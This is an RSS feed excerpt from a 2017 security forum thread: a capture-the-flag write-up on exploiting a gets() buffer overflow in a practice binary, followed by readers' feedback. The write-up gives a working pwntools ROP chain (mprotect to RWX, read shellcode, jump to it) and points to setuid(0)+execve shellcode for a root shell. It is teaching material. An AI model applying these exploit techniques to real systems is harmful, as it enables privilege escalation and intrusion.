=&gt;  E.g. for someone whos not fit in gdb he most likely has not installed gdb-peda. A link or something like a “ressources” section would have fit nicely there. Since as to my knowledge “normal” gdb does not offer vmmap. so for him he’d be kinda confused confused here.</li>
<li>Headers would have made the formatting a bit easier to follow.<br>
=&gt; e.g. “Looking for a Vuln.”, “Building the exploit”, …</li>
<li>also the first command using scp didn’t work for me as displayed in the first try. switching to ssh did tho. Not sure if that’s a problem at my end right now tho.</li>
</ul>
<p>I’m looking forward to future posts from you.</p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/4</link>
        <pubDate>Fri, 28 Apr 2017 08:40:42 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-4</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <p>Thank you for this reply, in the next articles, i’ll try making my english better, and even go for explaining things more deeply, like you said, and i think you are right, <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">! Again, thank you for a such reply <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:">! Also i’m really happy you learned from this article! <img src="https://0x00sec.org/images/emoji/twitter/heart_eyes.png?v=9" title=":heart_eyes:" class="emoji" alt=":heart_eyes:"></p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/3</link>
        <pubDate>Thu, 27 Apr 2017 22:19:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-3</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[VVid0w]]></dc:creator>
        <description><![CDATA[
            <p>I learned quite a bit from your article! Although I do recommend that you add in a little bit of theory; like what is ROP, what’s RIP, what’s a “buffer”, and what’s the difference between 64-bit ROP &amp; 32-bit ROP (If there is difference. If there’s a whole plethora of differences, then perhaps make another article explaining that?) to the beginning of your article and use more horizontal-rules so people can differentiate between sections easier.</p>
<p>Also, I understand that English may not be your native language but you may want to check up on a few spelling mistakes.</p>
<p>I’m glad that you wrote this article though! Keep on writing and you’ll get better with each and every one. I would like to say again that I did learn <em>quite</em> a lot from you! You did a pretty good job with this and explained things quite well.</p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/2</link>
        <pubDate>Thu, 27 Apr 2017 22:14:23 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-2</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <h3>Solving a ROP on 64-bit challenge <img src="https://0x00sec.org/images/emoji/twitter/grinning.png?v=9" title=":grinning:" class="emoji" alt=":grinning:">
</h3>
<p>In the name of Allah, the most beneficent, the most merciful.</p>
<hr>
<p>##<span class="hashtag">#Before</span> i begin this article, i want to thank <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> for showing me this beautiful community <img src="https://0x00sec.org/images/emoji/twitter/yum.png?v=9" title=":yum:" class="emoji" alt=":yum:">…</p>
<ul>
<li>This article is for learning purposes… <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:">
</li>
<li>Hello everybody, this my first article ever, i’m not really good at explaining things… But still, i will try making everything clear for you…</li>
<li>So in this task we were given a binary, and its source code… So the first thing is that we should identify the bug, and try to do something with it…</li>
<li>Also one thing to keep in mind, the binary does read our input and print it in hexadecimal.</li>
</ul>
<p>The following lines seem interesting…</p>
<pre><code class="lang-auto">char buffer[256];
gets(buffer);
</code></pre>
<p>So we have an array named buffer, which size is 256.<br>
and then comes a call to gets();</p>
<blockquote>
<p>gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (aq\0aq).</p>
</blockquote>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://linux.die.net/favicon.ico" class="site-icon" width="32" height="32">
      <a href="https://linux.die.net/man/3/gets" target="_blank" rel="noopener nofollow ugc">linux.die.net</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://linux.die.net/man/3/gets" target="_blank" rel="noopener nofollow ugc">gets(3): input of char/strings - Linux man page</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>uhm, so it will read from stdin, until it gets newline. “\x0a”</p>
<p>Seems just perfect. so it will take our input, and stores it in buffer, one question that comes to our mind now…<br>
What if the size of our input was &gt; sizeof(buffer);</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/b/b21c8591e3150488218f1e3c0bd1f96f0e55ff23.png" width="690" height="85"></p>
<ul>
<li>The answer is that we’ll overwrite the value of saved RIP.</li>
</ul>
<p>mean that we control the flow of the program…</p>
<p>Let’s try that in the real challenge now…</p>
<p>Let’s first download the binary…</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/ab6e395b666a1a342f3167b8f194a4213519e178.png" width="690" height="207"></p>
<p>Then let’s try to do what we talked about, making the size of input bigger than the size of the array:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/d/d4b602a20b809d21c04df0a23b3685c3bfffc9c2.png" width="690" height="160"></p>
<p>Interesting, we got Segmentation fault, which is actually a signal…</p>
<blockquote>
<p>In computing, a segmentation fault (often shortened to segfault) or access violation is a fault, or failure condition, raised by hardware with memory protection, notifying an operating system (OS) the software has attempted to access a restricted area of memory (a memory access violation).</p>
</blockquote>
<p>So we can deduce that the RIP pointed to 0x41414141 and tried reading the instuction from that invalid address leading into this…</p>
<p>Awesome! but the question now, is what pad should we use till we reach the RIP saved address… what we should do is decrementing till it exits normally and add one, that’s the perfect padding…</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/c/c538d09948896aeb60154aee619bd2ef36a48f39.png" width="690" height="269"></p>
<p>Seems good, so the perfect pad to saved RIP is 280!<br>
let’s make sure it’s the right pad…</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a5232793128dcbd6c2d873a3ece38d5db06f9422.png" width="677" height="91"><br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/e/e006e89d361c0e3af0ca40cd7d183f039eda0421.png" width="309" height="57"></p>
<p>And that’s just what we were looking for… Perfect!</p>
<p>Now what to do? we got control over RIP, what’s next?</p>
<p>The next thing is to find gadgets, that’ll help us get shell in some way…</p>
<p>To do this, you can use multiple tools, i use Ropper! a really great tool to search for gadgets ending with a ret; so it just won’t exit, instead, calls the following address.</p>
<p>This challenge, has the following protections on:<br>
<code>FULL RELRO NX ASLR</code></p>
<p>But, we have a more powerful thing, is that we have control over RIP… and we got alot of gadgets, since the binary is statically linked…</p>
<p>So now, we should make a plan for the attack…<br>
what can we do to get a shell?</p>
<p>The first thing that comes to mind, is making an area in memory [executable, writeable, readable] (RWX), and put shellcode into it, and simply return to it…</p>
<p>To do this, we first got to understand the usage of some functions, like mprotect(), and read()…</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/3/3a0ff54d4f4627ea930b31383b6558fede053b1d.png" width="408" height="195"></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/0c75847799ded4eae24fa97180f728b4c6506701.png" width="404" height="126"></p>
<p>And we can see that both function, take 3 arguments… And make use of them!</p>
<p>So let’s see the binary, and write what we will be doing!</p>
<blockquote>
<p>1ST : mprotect() an area, making it RWX!<br>
2ND :  read() our shellcode from stdin ( fd = 0 ) into the area we made executable.<br>
3RD : return to the area.</p>
</blockquote>
<p>So let’s look for a good address to make it’s permissions RWX!</p>
<ul>
<li>We’ll be using vmmap in gdb-peda to see the areas.<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/9/9a60f5f5f0abedb102fe1e72947af5aeab9d298f.png" width="673" height="204">
</li>
</ul>
<p>Uhmm!</p>
<ul>
<li>We’ll choose 0x6bf000 !</li>
</ul>
<p>So our usage of mprotect() will be like the following:<br>
<code>mprotect(0x6bf000(*addr), 0x100(len), PROT_READ|PROT_WRITE|PROT_EXEC(prot));</code><br>
And our usage of read():<br>
<code>read(stdin(fd=0), 0x6bf000(*buf), 0x100(len));</code></p>
<p>Now, what gadgets can help us invoke the following calls?</p>
<p>We’ll use ropper to get the gadgets!<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d6b82f4121c1873ab805c30ffd61af2b322e6137.jpeg" class="thumbnail onebox-avatar" width="197" height="197">

<h3><a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener nofollow ugc">sashs/Ropper</a></h3>

<p>Display information about files in different file formats and find gadgets to build rop chains for different architectures (x86/x86_64, ARM/ARM64, MIPS, PowerPC, SPARC64). For disassembly ropper us...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
Let’s try and use ropper!<p></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/d/d4374f8214658316284049caa7d957a33edb260f.png" width="667" height="68"></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/ac787f32dbeff2bf4eb25e54461294bfb9f2014f.png" width="642" height="56"></p>
<p>And that will give you all gadgets, will take some time to load…</p>
<p>let’s find the gadgets that interests us!</p>
<p>syscall; ret; ( invoking the syscall )<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/3/3dcbde4b22e4a5774d4fd305e2d339605ddbf27e.png" width="330" height="25"><br>
pop rax; ret; ( syscall number )<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/5/5306c9a4e67539e0097a98823e9974a68eb0db06.png" width="307" height="21"><br>
pop rdi; ret; ( 1st argument )<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/c/cd1b57b7e80c79e1f4f2c99d6be474f75418044b.png" width="316" height="24"><br>
pop rsi; ret; ( 2nd argument )<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/1/14531bf4c66d7088355e6819e7454285ff315e99.png" width="313" height="24"><br>
pop rdx; ret; ( 3rd argument )<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/b/b309f8bd02f0c21d97ef806c4743a6d196a18c82.png" width="301" height="25"></p>
<p>So now we have the gadgets, enough to invoke a call!</p>
<p>We will also make use of this table:</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="https://filippo.io/linux-syscall-table/" target="_blank" rel="noopener nofollow ugc">filippo.io</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://filippo.io/linux-syscall-table/" target="_blank" rel="noopener nofollow ugc">Searchable Linux Syscall Table for x86 and x86_64 | PyTux</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>And we get syscall numbers for read() and mprotect()</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/c/c80729e255c8255aab15ad42b060e7322d75c38b.png" width="690" height="392"></p>
<ul>
<li>So for mprotect() we should set RAX to 0xa and for read() RAX should be set to 0x0</li>
</ul>
<p>Now we’ve reached a part, where a problem becomes obvious. 0xa, is a newline char, sending it will corrupt our payload…<br>
So we gotta find another way to control RAX, zeroing it out, using xor, and then increment it using add!</p>
<p>Gadgets that’ll help us do this:<br>
xor rax with itself, resulting in RAX = 0; and ret;<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/e/e447c84c20d3e363ed7af02dc261123626b82702.png" width="351" height="20"><br>
increment RAX!<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/2/2c4ab09dc2f9f309d82139acc47d65926c46a05a.png" width="332" height="23"></p>
<p>So now to making the exploit we’ll start with putting what we already know there:</p>
<pre><code class="lang-python">#!/usr/bin/python
from pwn import *

c = process("./ch34")

# GADGETS
xorrax = 0x41bd9f
incrax = 0x45aa10
poprdi = 0x4016d3
poprsi = 0x4017e7
poprdx = 0x437205
syscall = 0x45b525
# ADDR
buf = 0x6bf000
# SYSCALL NUMS
mprotect = 0xa
read = 0x0

# EXPLOIT
payload = "A" * 280

# SENDING
c.sendline(payload)
c.interactive()
</code></pre>
<p>If we pop a register then the next address will be assigned to it as a value…</p>
<p>So let’s try to make use of the gadgets we found!<br>
we’ll only modify the # EXPLOIT section in the exploit…</p>
<pre><code class="lang-python"># EXPLOIT
payload = "A" * 280
payload += p64(xorrax) # SET RAX = 0
payload += p64(incrax) * 10 # SET RAX = 10
</code></pre>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/9/95446560f87db043c09f0488d49e352fe27a4316.png" width="151" height="29"></p>
<p>And it worked! we can now continue with other registers!</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/c/c9583aa6058ed368f3a48b533c55e30c4da7a703.png" width="610" height="340"></p>
<pre><code class="lang-python"># EXPLOIT
payload = "A" * 280
payload += p64(xorrax) # SET RAX = 0
payload += p64(incrax) * 10 # SET RAX = 10
payload += p64(poprdi) # 1ST ARGUMENT
payload += p64(buf) # ADDRESS
payload += p64(poprsi) # 2ND ARGUMENT
payload += p64(0x100) # SIZE
payload += p64(poprdx) # 3RD ARGUMENT
payload += p64(0x7) # RWX
payload += p64(syscall) # SYSCALL
</code></pre>
<p>Let’s try and see now, if our area is executable! <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/c/cd55c51b93759c4fe3f023549a46fe9cafcfa527.png" width="675" height="21"></p>
<p>That’s awesome! the area have now RWX permissions!</p>
<p>What do we need to do now?<br>
We need to read the shellcode from stdin and place it in the executable area!</p>
<pre><code class="lang-python"># EXPLOIT
payload = "A" * 280
payload += p64(xorrax) # SET RAX = 0
payload += p64(incrax) * 10 # SET RAX = 10
payload += p64(poprdi) # 1ST ARGUMENT
payload += p64(buf) # ADDRESS
payload += p64(poprsi) # 2ND ARGUMENT
payload += p64(0x100) # SIZE
payload += p64(poprdx) # 3RD ARGUMENT
payload += p64(0x7) # RWX
payload += p64(syscall) # SYSCALL
payload += p64(xorrax) # SET RAX = 0
payload += p64(poprdi) # 1ST ARGUMENT
payload += p64(0x0) # STDIN
payload += p64(poprsi) # 2ND ARGUMENT
payload += p64(buf) # ADDRESS
payload += p64(poprdx) # 3RD ARGUMENT
payload += p64(0x100) # SIZE
payload += p64(syscall) # SYSCALL
</code></pre>
<p>And that will be enough to invoke a mprotect() to make the area executable and then read() shellcode from stdin ( fd = 0 ) but still we didn’t do one thing, is returning to shellcode!</p>
<p>To do it, we need to add one line! remember it’s syscall; ret;<br>
So we need to add:</p>
<blockquote>
<p>payload += p64(buf)</p>
</blockquote>
<p>And also, since it’ll read the shellcode from stdin, we’ll add a variable named shellcode containing a x86_64 shellcode…<br>
and send it right after:</p>
<pre><code class="lang-python">c.sendline(payload)
c.sendline(shellcode)
</code></pre>
<ul>
<li>And i think that’s enough to come with a shell!</li>
</ul>
<p>Time to try!</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/3/3d38ca9b64de8abef9b35ae5c6fe4fc695881ada.png" width="690" height="260"></p>
<p>And we successfully got our lovely shell!<br>
to exploit now on remote, and i’m a windows user… we got to take our payload and change it’s form…</p>
<ul>
<li>Write payload to a file and take it out of my VM…</li>
<li>Write a little php script to make it in the form i want…</li>
</ul>
<pre><code class="lang-php">&lt;?php
error_reporting(0);
$c = file_get_contents('payload');
for($i = 0; $i &lt; strlen($c); $i++){
$a = $c[$i];
$h = base_convert(ord($a), 10, 16);
if(strlen($h) &lt; 2){
$p = "0";
}else{
$p = "";
}
$n .= "\x".$p.$h;
}
print $n;
?&gt;
</code></pre>
<p>And that will give us the payload in the following form:<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/d/ddb391f79e9dc64ace5b8debf52e6cc573d5dc0d.png" width="690" height="21"></p>
<p>So we can use it: (python -c ‘print “(payload here)”’; python -c ‘print “(shellcode here)”’; cat) | ./ch34</p>
<p>after doing so!<br>
We failed…<br>
We got a shell, but no root permissions!</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/c/cf0d874ba4e6afa00e5df306b90d5fd692ff9321.png" width="690" height="45"></p>
<p>What about an setuid(0); and then execve(’/bin/sh’); shellcode?</p>
<p></p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <a href="http://shell-storm.org/shellcode/files/shellcode-77.php" target="_blank" rel="noopener nofollow ugc">shell-storm.org</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="http://shell-storm.org/shellcode/files/shellcode-77.php" target="_blank" rel="noopener nofollow ugc">Linux/x86-64 - setuid(0) + execve(/bin/sh) 49 bytes</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
And yeah! it worked…<p></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/0d596e0a1751e107a7406fa6f46c8b3165deeed7.png" width="690" height="31"></p>
<p>We successfully exploited it using Return oriented programming!<br>
Hope you understood well, and enjoyed reading as well!<br>
If people like such simple articles, i’ll try making more later! <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p>~ exploit</p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/1</link>
        <pubDate>Thu, 27 Apr 2017 19:36:03 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-1</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
  </channel>
</rss>
